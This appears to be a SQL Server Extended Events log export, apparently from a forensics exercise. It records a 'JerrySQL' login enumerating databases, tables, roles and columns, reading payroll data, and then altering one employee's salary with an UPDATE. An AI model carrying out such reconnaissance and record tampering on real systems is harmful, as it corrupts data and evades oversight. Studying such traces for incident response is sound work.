"name","timestamp","timestamp (UTC)","cpu_time","duration","page_server_reads","physical_reads","logical_reads","writes","spills","row_count","result","batch_text","username","session_id","server_principal_sid","server_principal_name","server_instance_name","database_name","client_pid","client_hostname","client_connection_id","client_app_name","collect_system_time"
"sql_batch_completed","2023-07-23 19:12:40.8332598","2023-07-23 19:12:40.8332598","0","5137","0","8","49","0","0","0","OK","ALTER EVENT SESSION [Test] ON SERVER STATE=START  ","MSSQL-SR\Administrator","63","0x010500000000000515000000F3360381BD0F9EBEE2B16B17F4010000","MSSQL-SR\Administrator","MSSQL-SR","master","784","MSSQL-SR","10ADB4C1-AC7C-44B1-B2CB-1CECBC0038BE","Microsoft SQL Server Management Studio","2023-07-23 19:12:40.8310949"
"sql_batch_completed","2023-07-23 19:13:55.4983350","2023-07-23 19:13:55.4983350","0","172","0","0","0","0","0","1","OK","SELECT SUSER_SNAME()","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:13:55.5197285"
"sql_batch_completed","2023-07-23 19:14:01.2649012","2023-07-23 19:14:01.2649012","31000","41960","0","85","2373","0","0","6","OK","SELECT name, SUSER_SNAME(owner_sid) AS DatabaseOwner FROM sys.databases;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:01.1142623"
"sql_batch_completed","2023-07-23 19:14:06.9946628","2023-07-23 19:14:06.9946628","47000","61817","0","137","2957","0","0","0","OK","USE Seinfeld_Customers; SELECT name AS TableName FROM sys.tables;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Customers","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:06.8182843"
"sql_batch_completed","2023-07-23 19:14:14.6098787","2023-07-23 19:14:14.6098787","31000","55842","0","141","2749","0","0","2","OK","USE Seinfeld_Employees; SELECT name AS TableName FROM sys.tables;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:14.0981233"
"sql_batch_completed","2023-07-23 19:14:23.3537139","2023-07-23 19:14:23.3537139","31000","46907","0","85","1656","0","0","3","OK","USE Seinfeld_Employees; SELECT a.name AS UserName, b.name AS RoleName FROM sys.database_role_members drm JOIN sys.database_principals a ON drm.member_principal_id = a.principal_id JOIN sys.database_principals b ON drm.role_principal_id = b.principal_id;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:22.2964056"
"sql_batch_completed","2023-07-23 19:14:28.9277903","2023-07-23 19:14:28.9277903","16000","67610","0","126","3116","0","0","3","OK","USE Seinfeld_Employees; SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Data';","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:28.3199480"
"sql_batch_completed","2023-07-23 19:14:33.4111615","2023-07-23 19:14:33.4111615","15000","11379","0","35","354","0","0","5","OK","USE Seinfeld_Employees; SELECT id, Name, Position from Data;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:32.6608287"
"sql_batch_completed","2023-07-23 19:14:38.9059008","2023-07-23 19:14:38.9059008","31000","49270","0","632","3122","0","0","2","OK","USE Seinfeld_Employees; SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Payroll';","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:38.0078453"
"sql_batch_completed","2023-07-23 19:14:43.9728062","2023-07-23 19:14:43.9728062","0","10547","0","36","362","0","0","5","OK","USE Seinfeld_Employees; SELECT id, Salary from Payroll;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:43.7616550"
"sql_batch_completed","2023-07-23 19:14:51.1382877","2023-07-23 19:14:51.1382877","0","13272","0","40","476","0","0","5","OK","USE Seinfeld_Employees; SELECT a.Name, b.Salary FROM Data a LEFT JOIN Payroll b ON b.id = a.id;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:50.7253078"
"sql_batch_completed","2023-07-23 19:14:56.6008728","2023-07-23 19:14:56.6008728","0","9611","0","22","380","1","0","1","OK","USE Seinfeld_Employees; UPDATE Payroll SET Salary = 123456 WHERE id = 5;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:56.5868241"
"sql_batch_completed","2023-07-23 19:15:02.3278986","2023-07-23 19:15:02.3278986","16000","8283","0","19","464","0","0","5","OK","USE Seinfeld_Employees; SELECT a.Name, b.Salary FROM Data a LEFT JOIN Payroll b ON b.id = a.id;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:15:02.3490365"
